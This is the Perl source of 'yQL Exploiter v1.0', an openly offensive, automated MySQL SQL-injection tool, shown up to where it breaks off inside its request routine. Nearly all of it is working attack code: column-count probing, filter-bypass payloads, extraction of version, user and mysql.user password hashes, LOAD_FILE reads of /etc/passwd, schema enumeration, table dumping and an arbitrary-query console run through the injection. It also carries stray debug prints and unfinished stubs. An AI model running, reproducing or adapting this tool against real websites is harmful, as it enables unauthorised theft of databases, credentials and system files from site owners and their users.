#!/usr/bin/perl

# Name    :  yQL Exploiter
# Release :  v 1.0
# Author  :  "Osirys", Giovanni Buzzin
# Contact :  osirys[at]autistici[dot]org / me[at]y-osirys[dot]com
# Web     :  y-osirys.com
# Date    :  24/11/2009

# GNU GPL LICENCE:
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any
# the Free Software Foundation; either version 2 of the License, or later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free
# Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

# Description:

# This software is a complete tool for MySQL Injection exploiting. It just uses sockets, so you will not need any
# modules installed in your box. Features:

# HTTP Proxy Support
# Log File Support
# GET/COOKIE/POST Request
# Column number finding
# Column printed finding
# Database Dumping
# Dumping from any database you have access to

# Code begins here

use IO::Socket::INET;

my @dbs;
my $info_schema_other_dbs;
$start_kind  = $ARGV[0];
$start_kind_ = $ARGV[1];
$treq        = $ARGV[2];
$treq_       = $ARGV[3];

print "\n".
      "------------------------------\n".
      "         yQL Exploiter        \n".
      "      Visit : y-osirys.com    \n".
      "          by Osirys           \n".
      "------------------------------\n\n";

if ((!$start_kind)||(!$treq)||(!$start_kind_)||(!$treq_)||($start_kind_ !~ /[1-3]/)||($treq_ !~ /[1-2]/)) {
     print "[-] Bad arguments !\n\n".
           "    Usage: $0 -a 1|2|3 -b 1|2\n".
           "    -a 1 -> Finds columns number ONLY\n".
           "    -a 2 -> Dumps with the completed SQL String\n".
           "    -a 3 -> Finds columns and then dumps (FULL Automated Exploitation)\n".
           "\n".
           "    -b 1 -> GET  Request\n".
           "    -b 2 -> POST Request\n\n";
     exit(0);
}
else {
     print "[+] yQL Exploiter Started !\n\n";
}

if ($start_kind_ == 1) {
     &sql_exploit_1;
}
elsif ($start_kind_ == 2) {
     &sql_exploit_2;
}
elsif ($start_kind_ == 3) {
     &sql_exploit_1;
     &sql_exploit_2;
}

sub sql_exploit_1() {
     my $pk;

     print "[+] Columns and SQL Exploit Generation Step :\n";
     if ($treq_ == 1) {
          print "[+] Type now the website with :INJ: near the bugged variable\n".
                "    (Ex 1: http://site.it/page.php?id=2 :INJ:&var=2)\n".
                "    (Ex 2: http://site.it/cms/page.php?id=2 :INJ:%23&var=2)\n".
                "     Place :INJ: near your bugged variable\n".
                "     After :INJ: you can put the end of your SQL code, like -- \%23 etc\n".
                "\n[*] Site: ";

          chomp($site = <STDIN>);
          $site =~ /:INJ:(.*)/ || die "\n[-] Missing :INJ:\n\n";
          $een = $1;
          get_input($site,1);
          $pk = $path;
     }
     elsif ($treq_ == 2) {
          print "[+] Type now the website with the full path of the vulnerable page\n".
                "    (Ex: http://www.site.it/cms/vuln_page.php)\n".
                "\n[*] Site: ";
          chomp($site = <STDIN>);

          print "[+] Type now the POST request with the SQL code\n".
                "    (Ex 1: ordine=giorno&corso_laurea=1 :INJ:&var=2)\n".
                "    (Ex 2: ordine=giorno&corso_laurea=1' and 1=2 :INJ:#&var=2)\n".
                "     Place :INJ: near your vulnerable variable\n".
                "     After :STOP: you can put the end of your SQL code, like --,# etc\n".
                "\n[*] POST Request: ";
          chomp($pcontent = <STDIN>);
          $pcontent =~ /:INJ:(.*)/ || die "\n[-] Missing :INJ:\n\n";
          $een = $1;
          get_input($site,2);
          $pk = $pcontent;
     }

     config($pk,1);

     print_s("[!] yQL Exploiter v 1.0\n",1);
     print_s("[!] Coded by Giovanni Buzzin, \"Osirys\"\n",1);
     print_s("[!] Visit : y-osirys.com\n",1);
     print_s("\n[+] Column Number finder Step Started !\n",1);
     print_s("[+] Host: $h0st\n\n",1);

     print "\n[+] Type now the condition (TRUE/FALSE) to match with a static response\n".
           "    1 -> True Condition  (1=1)\n".
           "    2 -> False Condition (1=2)\n".
           "[*] Condition: ";
     chomp($matchk = <STDIN>);
     $matchk =~ /[1-2]/ || die "\n[-] Bad Match Kind !\n\n";

     print "\n[+] Type now static response to match the columns number\n".
           "[*] Response: ";
     chomp($match = <STDIN>);
     $match =~ /.+/ || die "\n[-] Bad Match response !\n\n";

     print "\n[+] Filters Bypass :\n".
           "    1 -> YES (/**/|aNd|uNiON|..)\n".
           "    2 -> NO\n".
           "[*] Bypass: ";
     chomp($bypass = <STDIN>);

     print "\n[+] Type now max number of columns to test on:\n".
           "    Ex: 100\n".
           "[*] Num: ";
     chomp($max = <STDIN>);
     $max =~ /[0-9]+/ || die "\n[-] Missin max columns number to test on !\n\n";

     print "\n[+] HTTP Proxy :\n".
           "    Leave blank if you will not use it\n".
           "    <ip:port>   if you will use it\n".
           "    (Ex: 88.88.88.88:3128)\n".
           "[*] Proxy: ";
     chomp($proxy = <STDIN>);

     if ($proxy =~ /(.+):(.+)/) {
          $proxya = $1;
          $proxyp = $2;
     }
     else {
          $proxy = 0;
     }

     my $num = 1;
     my $c_string = "";
     while (($num <= $max)&&($resp != 1)) {
          if ($num == 1) {
               push(@columns,1);
               $pcontent_ = $pk;
               if ($bypass == 1) {
                    $string = "uNiOn/**/sElEcT/**/".$num;
                    $pcontent_ =~ s/\s*:INJ:/\/**\/$string/;
               }
               else {
                    $string = "union select ".$num;
                    $pcontent_ =~ s/:INJ:/$string/;
               }
               print "\n";
               $resp = column_match($pcontent_,1);
          }
          else {
               my $string_;
               push(@columns,$num);
               foreach my $n(@columns) {
                    $string_ .= $n.",";
               }
               $string_ =~ s/,$//;
               $pcontent_ = $pk;
               if ($bypass == 1) {
                    $string = "uNiOn/**/sElEcT/**/".$string_.$esc;
                    $pcontent_ =~ s/\s*:INJ:/\/**\/$string/;
               }
               else {
                    $string = "union select ".$string_.$esc;
                    $pcontent_ =~ s/:INJ:/$string/;
               }
               $resp = column_match($pcontent_,$num);
          }
          $num++;
     }

     if ($resp != 1) {
          print_s("\n[-] Unable to find the right number of columns !\n\n");
          exit(0);
     }
}

sub sql_exploit_2() {
     sleep(2) if ($start_kind_ == 3);
     if ($treq_ == 1) {
          if ($start_kind_ != 3) {
               print "[+] Dumping Step :\n".
                     "[+] Type now the union SQL Injection ->\n".
                     "    (Ex1: http://site.it/page.php?id=2 and 1=2 union select 1,:print:,2,3:STOP:&var=2)\n".
                     "    (Ex2: http://site.it/cms/page.php?id=-2' union select 1,:print:,2,3:STOP:\%23&var=2)\n".
                     "     Place :print: instead of the column that prints rows. ! Insert just one :print:\n".
                     "     Place :STOP: at the end of the select of you Injection\n".
                     "     After :STOP: you can put the end of you Inj, like --, or \%23 etc\n".
                     "\n[*] Site: ";
               chomp($site = <STDIN>);
               $site =~ /:print:/ || die "\n[-] Missing :print: in SQL Inj\n\n";
               $site =~ /:STOP:/ || die "\n[-] Missing :STOP: at the end of SQL Inj\n\n";
               get_input($site,1);
               $pkkk = $path;
          }
     }
     elsif ($treq_ == 2) {
          if ($start_kind_ != 3) {
               print "[+] Dumping Step :\n".
                     "[+] Type now the hostname of your site with the full path of the script ->\n".
                     "    (Ex: http://www.site.it/cms/vuln_page.php)\n".
                     "\n[*] Site: ";
               chomp($site = <STDIN>);
               print "[+] Type now the content of your request within the SQL Inj->\n".
                     "    (Ex1: ordine=giorno&corso_laurea=1 and 1=2 union select 1,:print:,2:STOP:&var=2)\n".
                     "    (Ex2: ordine=giorno&corso_laurea=-1' union select 1,:print:,2:STOP:#&var=2)\n".
                     "     Place :print: instead of the column that prints rows. ! Insert just one :print:\n".
                     "     Place :STOP: at the end of the SQL Injection\n".
                     "     After :STOP: you can put the end of you Inj, like --,# etc\n".
                     "\n[*] Content: ";
               chomp($pcontent = <STDIN>);
               $pcontent =~ /:print:/ || die "\n[-] Missing :print: in SQL Inj\n\n";
               $pcontent =~ /:STOP:/ || die "\n[-] Missing :STOP: at the end of SQL Inj\n\n";
               get_input($site,2);
               $pkkk = $pcontent;
          }
     }

     if (($start_kind_ != 3)&&($proxy == 0)) {
          print "[+] HTTP Proxy :\n".
                "    Leave blank if you will not use it\n".
                "    <ip:port>   if you will use it\n".
                "    (Ex: 88.88.88.88:3128)\n".
                "[*]  Proxy: ";
          chomp($proxy = <STDIN>);

          if ($proxy =~ /(.+):(.+)/) {
               $proxya = $1;
               $proxyp = $2;
          }
          else {
               $proxy = 0;
          }
     }

     if ($start_kind_ == 3) {
          config($site);
     }
     else {
          config($pkkk,1);
     }

     if ($start_kind_ == 2) {
          print_s("[!] yQL Exploiter\n",1);
          print_s("[!] Coded by Giovanni Buzzin, \"Osirys\"\n",1);
          print_s("[!] Visit : y-osirys.com\n\n",1);
          print_s("\n[+] Extracting datas from: $h0st\n");
     }
     if ($proxy != 0) {
          print_s("[!] Using $proxya:$proxyp as proxy ..\n");
     }
     print_s("[!] General information :\n");

     @gen_data = qw(version\(\) database\(\) user\(\));
     my $count = 0;
     foreach my $e(@gen_data) {
          my $info;
          $count++;
          my $inj = &get_sql_inj($e,0,0,0);
          my $re = req($inj,"\{ownedE\}");
          if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
               $info = $1;
          }
          if ($info !~ /.{2,50}/) {
               $info =~ s/.*/n.a/;
          }
          if ($count == 1) {
               print_s("    [VERSION] : $info\n");
               $mysql_version = $info;
          }
          elsif ($count == 2) {
               print_s("    [DATABASE]: $info\n");
               $database_name = $info;
          }
          elsif ($count == 3) {
               print_s("    [USER]    : $info\n");
               $mysql_user = $info;
          }
     }

     print_s("\n[+] Access to mysql.user :\n");
     my $inj = &get_sql_inj("Host User Password", "mysql.user", 0, 1);
     my $bb = &own("sql_compl",$inj,0);
     if ($bb != 1) {
          print_s("[*] Access to mysql.user : Disabled\n");
     }
     print_s("\n[+] LOAD_FILE status: ");
     my $inj = &get_sql_inj("load_file(0x2F6574632F706173737764)", 0, 0, 0);
     my $re = req($inj,"\{ownedE\}");
     if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
          my $con = $1;
          print_s("Enabled\n\n");
          print_s("Loaded file: /etc/passwd\n$con\n");
     }
     else {
          print_s("Disabled\n");
     }
     if ($mysql_version =~ /^5/) {
          $info_schema = 1;
          print_s("[+] Current MySQL version ($mysql_version) supports information_schema Table\n");
          my $inj = &get_sql_inj("schema_name", "information_schema.schemata", 0, 0);
          my $re = req($inj,"\{ownedE\}");
          if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
               #$info_schema_other_dbs = 1;print "\n\nmerdaaa $info_schema_other_dbs\n\n";
               print_s("[+] $mysql_user has access to :\n");
               $table_c = hex_conv("information_schema.schemata");
               my $rows = count_rows("information_schema.schemata", 0);print "\n\nll $rows\n\n";
               my $inj = &get_sql_inj("schema_name", "information_schema.schemata", 0, 1);
               my $bb = &own("sql_compl",$inj,0,$rows,1);
               $bb == 1 || print_s("[-] Something goes wrong ..\n");
               $info_schema_other_dbs = 1;print "\n\nmerdaaa $info_schema_other_dbs\n\n";
          }
          else {
               print_s("[-] $mysql_user has not access to other databases\n");
          }
     }
     else {
          $info_schema = 0;
          print_s("[-] Current MySQL version ($mysql_version) does not supports information_schema Table\n");
     }
     &main;
}

#select table_name from information_schema.tables where table_schema= db  #tabelle del db "db" -----> 1
#select column_name from information_schema.columns where table_schema=db  -------> 2
#select column_name from information_schema.columns where table_name=tabella and table_schema=db  -------> 3
#select colonne from database.tabella -------> 4

#select cast(group_concat(concat_ws(0x3a,id,title)) as char) from web_apps;

#hex(<br>) = 0x3c62723e
#hex(</br>) = 0x3c2f62723e







# 1:
#[+] Dumping all Tables from DB: 
#$rows = count_rows("information_schema.tables", "table_schema=".$db);#
#print_s("\n[+] Dumping all Tables from DB: $database_name !\n");#
#$rows = count_rows("information_schema.tables", 0);#
#$inj = &get_sql_inj("table_name", "information_schema.tables", "table_schema=".$db, 1);#
#$inj = &get_sql_inj("table_name", "information_schema.tables", 0, 1);#
#my $bb = &own("tables",$inj,1,$rows);#


# vars -> a b c d e f g h i l m n o p q r s t
#
##
#
#
#
#my($a,$b,$c,$d,$e,$f,$g,$h,$i,$l,$m,$n,$o,$p,$q,$r,$s,$t);
#if ($choose == 1) {
#     ($a,$b,$c,$d,$e,$f,$g,$h,$i,$l,$m,$n,$o,$p,$q,$r,$s,$t) = ("Dumping all Tables from DB: ","information_schema.tables",
#     "table_schema=".$db,"\n[+] Dumping all Tables from DB: $database_name !\n","information_schema.tables", 0,
#     "table_name", "information_schema.tables", "table_schema=".$db, 1,"table_name", "information_schema.tables", 0, 1,
#     "tables",$inj,1,$rows);
#}
#elsif ($choose == 2) {
#     ($a,$b,$c,$d,$e,$f,$g,$h,$i,$l,$m,$n,$o,$p,$q,$r,$s,$t) = ("Dumping all Columns from DB: ","information_schema.columns",
#     "table_schema=".$db,"\n[+] Dumping all Columns from DB: $database_name !\n","information_schema.columns", 0,
#     "column_name", "information_schema.columns", "table_schema=".$db, 1,"column_name", "information_schema.columns", 0, 1,
#     "columns",$inj,0,$rows);
#}
#elsif ($choose == 3) {


sub main {print "\nhhhhhhhhhh\n$info_schema_other_dbs\nhhhhhhhh\n";
     my($choose,$table,$table_c,$string,$columns_e,$table_e);
     print "\n".
           "[!] Mysql Command Line spawned on : $h0st\n".
           "    Type help for a list of command.\n";
     while (1) {
          print "\n$mysql_user : ";
          chomp($choose = <STDIN>);
          if ($choose =~ /[1-6]|help|h|e|l/) {
               if (($choose =~ /^l$/)&&($info_schema_other_dbs == 1)) {
                    my $c = 0;
                    print_s("[+] Getting list of databases which $mysql_user has access to: \n");
                    foreach my $e(@dbs) {
                         $c++;
                         print_s("    $c - $e\n");
                    }
               }
               elsif ($choose =~ /[1-4]{1}/) {
                    my($ok,$rows,$inj,$table,$table_c,$columns,$db,$db_c) = (0,undef,undef,undef,undef,undef,undef,undef);
                    if ($info_schema_other_dbs == 1) {
                         if ($choose == 1) {
                              print_s("[+] Dumping all Tables from DB: ");#
                         }
                         elsif ($choose == 2) {
                              print_s("\n[+] Dumping all Columns from DB: ");
                         }
                         elsif ($choose == 3) {
                              print_s("\n[+] Dumping Columns from database.table\n");
                              print_s("[+] Table: ");
                              chomp($table = <STDIN>);
                              print_s("$table\n",1);
                              $table_c = hex_conv($table);
                              print_s("[+] Database: ");
                         }
                         elsif ($choose == 4) {
                              print "\n[+] Dumping user selected columns from database.table\n";
                              print "[+] Columns (separeted with a space): ";
                              chomp($columns = <STDIN>);
                              print "[+] from Table: ";
                              chomp($table = <STDIN>);
                              print "[+] from DB: ";
                         }

                         chomp($db = <STDIN>);
                         my $db_c = hex_conv($db);
                         $found = in_array($db,@dbs);
                         if ($found != 1) {
                              print_s("[-] $db not in databases list !\n");
                         }
                         elsif (($choose == 3)&&($table !~ /(.+)/)) {
                              print_s("[-] Bad table syntax\n");
                         }
                         elsif (($choose == 4)&&(($table !~ /(.+)/)&&($columns !~ /(.+)/))) {
                              print_s("[-] Bad table and column syntax\n");
                         }
                         else {
                              $ok = 1;
                              if ($choose == 1) {
                                   $rows = count_rows("information_schema.tables", "table_schema=".$db_c);#
                              }
                              elsif ($choose == 2) {
                                   $rows = count_rows("information_schema.columns", "table_schema=".$db_c);#
                              }
                              elsif ($choose == 3) {
                                   $rows = count_rows("information_schema.columns", "table_name=".$table_c." and table_schema=".$db_c);#
                              }
                              elsif ($choose == 4) {
                                   $rows = count_rows($db.".".$table, 0);# ???????
                              }
                         }
                    }
                    else {
                         $ok = 1;
                         if ($choose == 1) {
                              print_s("\n[+] Dumping all Tables from DB: $database_name !\n");#
                              $rows = count_rows("information_schema.tables", 0);#
                         }
                         elsif ($choose == 2) {
                              print_s("\n[+] Dumping all Columns from DB: $database_name :\n");
                              $rows = count_rows("information_schema.columns", 0);
                         }
                         elsif ($choose == 3) {
                              print_s("\n[+] Dumping Columns from table: ");
                              chomp($table = <STDIN>);
                              print_s("$table\n",1);
                              $table_c = hex_conv($table);
                              $rows = count_rows("information_schema.columns", "table_name=$table_c");
                         }
                         elsif ($choose == 4) {
                              print "\n[+] Owning Step. Type now columns and table names to extract.\n[h] Use a space to separate elements\n";
                              print "[+] Table: ";
                              chomp($table = <STDIN>);
                              print "[+] Columns: ";
                              chomp($columns = <STDIN>);
                              if (($table =~ /(.+)/)&&($columns =~ /(.+)/)) {
                                   print_s("\n[*] [Dumping] --> Columns[$columns] from Table[$table]\n");
                                   $rows = count_rows($table, 0);
                              }
                              else {
                                   $ok == 0;
                                   print_s("[-] Bad table and column syntax\n");
                              }
                         }
                    }

#http://localhost/sitovecchiomio/?page=home&id=4 :INJ:
#0x737570657263616c69
                    if ($ok == 1) {
                         print_s("[?] Type now the extraction type:\n[+] 1 - Extracts with LIMIT (Lots of requests)\n".
                                 "[+] 2 - Extracts all in a single string with GROUP_CONCAT (Single request)\n[+] Extraction Type: ");
                         chomp(my $ext_t = <STDIN>);
                         if ($ext_t =~ /[1-2]/) {
                              if ($ext_t == 1) {
                                   if ($info_schema_other_dbs == 1) {

                                        $inj = &get_sql_inj("table_name", "information_schema.tables", "table_schema=".$db, 1);#

                                   }
                                   else {

                                        $inj = &get_sql_inj("table_name", "information_schema.tables", 0, 1);#

                                   }

                                   my $bb = &own("tables",$inj,1,$rows);#

                                   $bb == 1 || print_s("[-] Something goes wrong ..\n");
                              }
                              elsif ($ext_t == 2) {


                              }
                         }
                         else {
                              print_s("[-] Bad extraction type\n");
                         }
                    }
               }
               #elsif ($choose == 2) {
               #     print_s("\n[+] Dumping all Columns from DB: $database_name :\n");
               #     my $rows = count_rows("information_schema.columns", 0);
               #     print_s("[?] Type now the extraction type:\n[+] 1 - Extracts with LIMIT (Lots of requests)\n".
               #             "[+] 2 - Extracts all in a single string with GROUP_CONCAT (Single request)\n[+] Extraction Type: ");
               #     chomp(my $ext_t = <STDIN>);
               #     if ($ext_t =~ /[1-2]/) {
               #          if ($ext_t == 1) {
               #               my $inj = &get_sql_inj("column_name", "information_schema.columns", 0, 1);
               #               my $bb = &own("columns",$inj,0,$rows);
               #               $bb == 1 || print_s("[-] Something goes wrong ..\n");
               #          }
               #          elsif ($ext_t == 2) {


               #          }
               #     }
               #     else {
               #          print_s("[-] Bad extraction type\n");
               #     }
               #}
               #elsif ($choose == 3) {
               #     print_s("\n[+] Dumping Columns from table: ");
               #     chomp($table = <STDIN>);
               #     print_s("$table\n",1);
               #     $table_c = hex_conv($table);
               #     my $rows = count_rows("information_schema.columns", "table_name=$table_c");
               #     print_s("[?] Type now the extraction type:\n[+] 1 - Extracts with LIMIT (Lots of requests)\n".
               #             "[+] 2 - Extracts all in a single string with GROUP_CONCAT (Single request)\n[+] Extraction Type: ");
               #     chomp(my $ext_t = <STDIN>);
               #     if ($ext_t =~ /[1-2]/) {
               #          if ($ext_t == 1) {
               #               my $inj = &get_sql_inj("column_name", "information_schema.columns", "table_name=$table_c", 1);
               #               my $bb = &own("columns",$inj,0,$rows);
               #               $bb == 1 || print_s("[-] Something goes wrong ..\n");
               #          }
               #          elsif ($ext_t == 2) {


               #          }
               #     }
               #     else {
               #          print_s("[-] Bad extraction type\n");
               #     }
               #}
               #elsif ($choose == 4) {
               #     print "\n[+] Owning Step. Type now columns and table names to extract.\n[h] Use a space to separate elements\n";
               #     print "[+] Table: ";
               #     chomp(my $table = <STDIN>);
               #     print "[+] Columns: ";
               #     chomp(my $columns = <STDIN>);
               #     if (($table =~ /(.+)/)&&($columns =~ /(.+)/)) {
               #          print_s("\n[*] [Dumping] --> Columns[$columns] from Table[$table]\n");
               #          my $rows = count_rows($table, 0);
               #          print_s("[?] Type now the extraction type:\n[+] 1 - Extracts with LIMIT (Lots of requests)\n".
               #             "[+] 2 - Extracts all in a single string with GROUP_CONCAT (Single request)\n[+] Extraction Type: ");
               #          chomp(my $ext_t = <STDIN>);
               #          if ($ext_t =~ /[1-2]/) {
               #               if ($ext_t == 1) {
               #                    my $inj = &get_sql_inj($columns, $table, 0, 1);
               #                    my $bb = &own("sql_compl",$inj,0,$rows);
               #                    $bb == 1 || print_s("[-] Something goes wrong ..\n");
               #               }
               #               elsif ($ext_t == 2) {


               #               }
               #          }
               #          else {
               #               print_s("[-] Bad extraction type\n");
               #          }
               #     }
               #     else {
               #          print_s("[-] Bad table and column syntax\n");
               #     }
               #}
               elsif ($choose == 5) {
                # parte del cracking

               }
               elsif ($choose == 6) {
                    print "\n[+] MySQL Command Line. Version: $mysql_version\n".
                          "[+] DB Name : $database_name\n".
                          "[+] User    : $mysql_user\n[H] Type exit to go back in the main menu\n";
                    while (1) {
                         print "\n[+] Query   :";
                         chomp(my $query = <STDIN>);
                         print_s("[+] Query: $query",1);
                         if (length($query) < 3) {
                              print_s("[-] Bad query, or something wrong !\n");
                         }
                         elsif ($query =~ /^exit$/) {
                              &main;
                         }
                         else {
                              my $re = req($query,"\{ownedE\}");
                              if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
                                   my $out = $1;
                                   print_s("[+] Output: $out\n");
                              }
                              else {
                                   print_s("[-] Bad query, or something wrong !\n");
                              }
                         }
                    }
               }
               elsif ($choose =~ /help|h/) {print "\nhjh$info_schema\n$info_schema_other_dbs\n$bb\n\nhj\n";
                    if ($info_schema == 1) {
                         if ($info_schema_other_dbs == 1) {
                              $help = "\n[+] help()\n".
                                         "    l - Gets the list of all databases\n".
                                         "    1 - Extracts all tables  from user selected db\n".
                                         "    2 - Extracts all columns from user selected db\n".
                                         "    3 - Extracts all columns of a selected table from user selected db\n".
                                         "    4 - Owns. Gets user selected columns of a selected table from user selected db\n".
                                         "    5 - Crack your Hash\n".
                                         "    6 - MYSQL CMD line, type your own query\n".
                                         "    h - Help\n".
                                         "    e - Exit\n";
                         }
                         else {
                              $help = "\n[+] help()\n".
                                         "    1 - Extracts all tables  from current DB ($database_name)\n".
                                         "    2 - Extracts all columns from current DB ($database_name)\n".
                                         "    3 - Extracts all columns of a selected table from current DB ($database_name)\n".
                                         "    4 - Owns. Gets user selected columns of a selected table\n".
                                         "    5 - Crack your Hash\n".
                                         "    6 - MYSQL CMD line, type your own query\n".
                                         "    h - Help\n".
                                         "    e - Exit\n";
                         }
                         print $help;
                    }
                    elsif ($info_schema == 0) {
                         print_s("[+] ");
                         # bruta dato che info schema non ci sta ....

                    }
               }
               elsif ($choose =~ /^e$/) {
                    print "\n[-] Quitting ..\n\n";
                    exit(0);
               }
          }
          else {
               print "\n[-] Bad choise !\n";
          }
     }
}

sub own() {
     my($kind_s,$pack,$l,$rows,$arr) = @_;
     my($stop,$no) = (0,1);
     my(@data,$ff);
     if ($kind_s =~ /tables/) {
          $name = "Table";
     }
     elsif ($kind_s =~ /columns/) {
          $name = "Column";
     }
     elsif ($kind_s =~ /sql_compl/) {
          $name = "Data";
     }
     if ($l == 1) {
          $lim_1 = 17;
     }
     else {
          $lim_1 = 0;
     }
     my $count = 0;
     my $mx = $rows;$mx = $mx +5;
     while (($lim_1 <= $mx)&&($stop != 1)) {
          if (($lim_1 % 1 == 0)||($lim_1 == 0)) {
               my $tmp_pack = $pack;
               if ($pack_end =~ /.+/) {
                    $tmp_pack =~ s/limit $pack_end/limit $lim_1,$lim_2$pack_end/;
               }
               else {
                    $tmp_pack =~ s/limit /limit $lim_1,$lim_2/;
               }
               my $re = req($tmp_pack,"\{ownedE\}");#print "REQ: $tmp_pack\n";
               if ($re =~ m/\{owned\}([^{]+)\{ownedE\}/gi) {
                    if ($arr == 1) {
                         push(@dbs, $1);
                    }
                    $count++;
                    print_s("    [$name][$count/$rows] : [$1]\n");
                    $ff = 1;
               }
               else {#print "NOOOO\n";
                    $no++;
               }
               if ($no >= 4) {
                    $stop = 1;
               }
          }
          $lim_1++;#print "\nLimit: $lim_1\n";
     }
     return($ff);
}

sub count_rows() {
     my($table,$oth,$rtable) = @_;print "\n\nothzzz: $oth\n\n";
     my($numrows,$inj);print "\n\nokok\n\n";
     if (($oth != 0)||(length($oth) > 2)) {print "\npppppppppppppppppppppppp\n";
          $inj = &get_sql_inj("count(*)", $table, $oth, 0);print "\n\ninj $inj\n\n";
     }
     else {print "\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n";
          $inj = &get_sql_inj("count(*)", $table, 0, 0);
     }
     my $re = req($inj,"\{ownedE\}");
     if ($re =~ /\{owned\}([^{]+)\{ownedE\}/i) {
          $numrows = $1;
          print_s("\n[+] Found $numrows rows .\n");
     }
     else {
          print_s("\n[-] Unable to count the number of rows of the selected element .\n");
     }
     return($numrows);
}

sub column_match() {
     my $pkg = $_[0];
     my $count = $_[1];
     my $ok;
     print "[+] Injecting $count/$max ..\n";
     my $re = req($pkg,$match);
     if ($matchk == 1) {
          if ($re =~ /$match/g) {
               $ok = 1;
          }
          else {
               $ok = 0;
          }
     }
     elsif ($matchk == 2) {
          if ($re !~ /$match/g) {
               $ok = 1;
          }
          else {
               $ok = 0;
          }
     }
     if ($ok == 1) {
          print_s("\n[*] Number of Columns: $count\n".
                  "[*] INJ: $pkg\n".
                  "[+] Testing now for the printed column ..\n");
          my $st = 1;
          my $col;
          my $str;
          my @arr;
          while ($st <= $count) {#5f2d 2d5f  ->  _- -_
               #my $h = hex_conv(":.:..".$st."..:.:");
               my $h = hex_conv(":_".$st."_:");
               $str .= $h.",";
               $st++;
          }
          $str =~ s/,$//;
          $sssite = $pkg;
          $pkg =~ s/(\/\*\*\/|select )[0-9,]+/$1$str/;
          $pkg =~ s/(.+)(uNiOn|union)(.+)/$1 and 1=2 $2$3/;#print "kk $pkg\n";
          my $re = req($pkg,":_([0-9]+)_:");
          if ($re =~ /:_([0-9]+)_:/) {
               $cff = 1;
               $col = $1;
               print_s("[*] Injected : $pkg\n".
                       "[*] Printed column: $col\n");#print "\nbhbhbh $sssite\n\n";### REGEX DA MODIFICARE
               $sssite =~ s/(uNiOn\/\*\*\/sElEcT\/\*\*\/|union select )(.*)($col{1})(.*)$een/and 1=2 $1$2:print:$4$een/;#print "\nbhbhbjjh $sssite\n\n";
               $pkg =~ s/.+/$sssite/;
               if ($start_kind_ == 3) {
                    if (length($een) >= 1) {
                         $pkg =~ s/$een/:STOP:$een/;
                    }
                    else {
                         $pkg =~ s/(.+)/$1:STOP:/;
                    }
                    $site = $pkg;
               }
               else {
                    my $chhv = $pkg;
                    $chhv =~ s/:print:/\@\@version/;
                    if ($treq_ == 1) {
                         my $chhv = $pkg;
                         $chhv =~ s/:print:/\@\@version/;
                         print_s("[+] GET Packet :\n".
                                 "    GET ".encode("http://".$h0st.$chhv)." HTTP/1.1\n".
                                 "    Host: ".$h0st."\n\n");

                    }
                    elsif ($treq_ == 2) {
                         print_s("[+] POST Packet :\n".
                                 "    POST ".$path." HTTP/1.1\n".
                                 "    Host: ".$h0st."\n".
                                 "    User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2\n".
                                 "    Keep-Alive: 300\n".
                                 "    Connection: keep-alive\n".
                                 "    Content-Type: application/x-www-form-urlencoded\n".
                                 "    Content-Length: ".length($chhv)."\n\n".
                                 "    ".$chhv."\n\n");
                    }
               }
          }
          else {
               print_s("\n[-] Unable to find a printed column .. Possible Blind SQL Injection !\n\n");
               exit(0);
          }
     }
     return($ok);
}

sub get_sql_inj() {
     my($select_,$from_,$where_,$limit_) = @_;print "\njhhhhhh\n$where_\n\n";
     if ($from_ !~ /.{2,80}/) {
          $from = "";
     }
     else {
          $from = " from ".$from_;
     }
     if ($where_ !~ /.{2,80}/) {
          $where = "";
     }
     else {
          $where = " where ".$where_;
     }
     if ($limit_ == 0) {
          $limit = "";
     }
     else {
          $limit = " limit ";
     }
     $select_ =~ s/ /,0x3a,/g;
     my $inj = $pack_st." ".$first_sel.$select_.$second_sel.$from.$where.$limit.$pack_end;
     return($inj);
}

sub config() {
     my($pack,$j) = ($_[0],$_[1]);
     if ($j == 1) {
          $time = time();
          $fname = $h0st."_".$time.".txt";
          $pathh = "../live_auditing/owned/";
          $lim_2 = 1;
          $stop  = 0;
          $no    = 0;
          $max   = 10000;
     }
     $pack  =~ s/:print:/concat(0x7b6f776e65647d,:print:,0x7b6f776e6564457d)/;
     if ($pack =~ /(.+) union (.+):STOP:(.*)/) {
          $pack_st = $1;
          $injection = "union ".$2;
          $pack_end = $3;
          if ($injection =~ /(.+):print:(.*)/) {
               ($first_sel,$second_sel) = ($1,$2);
          }
     }
}

sub print_s() {
     my($msg,$opt) = @_;
     if ($opt == 1) {
          open($file,">>",$pathh.$fname) || die "\n[-] Unable to open Log file -> $pathh.$fname\n\n";
          print $file "$msg" || die "\n[-] Unable to write on Log file -> $pathh.$fname\n\n";
          close($file);
     }
     else {
          open($file,">>",$pathh.$fname);
          print "$msg";
          print $file "$msg";
          close($file);
     }
}

sub hex_conv() {
     my($string,@tmp,$hex) = ($_[0],undef,undef);
     @tmp = unpack('C*', $string);
     foreach my $c(@tmp) {
          $hex .= sprintf("%lx", $c);
     }
     $hex =~ s/.*/0x$hex/;
     return($hex);
}

sub get_input() {
     my($host,$reqq) = @_;
     $host =~ /http:\/\/(.+)/;
     $s_host = $1;
     if ($reqq == 1) {
          $s_host =~ /([0-9a-z.-]{1,30})\/(.*)/;
          ($h0st,$path) = ($1,$2);
          $path =~ s/(.*)/\/$1/;
     }
     elsif ($reqq == 2) {
          $s_host=~ /([0-9a-z.-]{1,30})(.+)\.([a-z0-9]{2,4})/;
          ($h0st,$path) = ($1,$2.".".$3);
          if ($path =~ /^([^\/])/) { $path =~ s/(.+)/\/$1/; }
     }
}

sub req() {
     my($pack,$regexp) = ($_[0],$_[1]);
     my($stop,$data,$string,@tmp_src,$text);

     if ($proxy != 0) {
          $addr = $proxy;
          $port = $pport;
     }
     else {
          $addr = $h0st;
          $port = '80';
